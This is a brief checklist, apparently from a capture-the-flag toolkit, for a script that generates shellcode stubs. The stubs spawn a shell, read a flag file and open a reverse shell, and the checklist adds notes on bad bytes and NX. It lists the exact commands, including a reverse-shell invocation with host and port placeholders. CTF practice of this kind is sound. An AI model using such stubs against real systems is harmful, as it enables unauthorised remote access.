# tools/sc_gen.py — tested shellcode stubs — checklist

Emits tested shellcode stubs: execve64/execve86 (shell), cat64 (read /flag), rev64 (reverse shell). --raw for hex-only output; it reports any banned bytes present.

## Checklist

- [ ] python3 tools/sc_gen.py execve64 --raw — the execve('/bin/sh') stub hex.
- [ ] python3 tools/sc_gen.py cat64 --path /flag --raw — read the flag file.
- [ ] python3 tools/sc_gen.py rev64 --host <h> --port <p> --raw — reverse shell.
- [ ] The tool reports any \x00\x0a\x0d\x20 bytes the stub contains — match against your read's filter.

## Abort conditions

- Only valid when NX is off — check pwn_triage.
- The stub must fit the bad-byte filter your read allows.
- cat64 needs the flag's real path — /flag, /flag.txt, or wherever the challenge puts it.

## Falsifier

Falsifier — NX is on: no shellcode executes; the stub is useless, go to ROP.
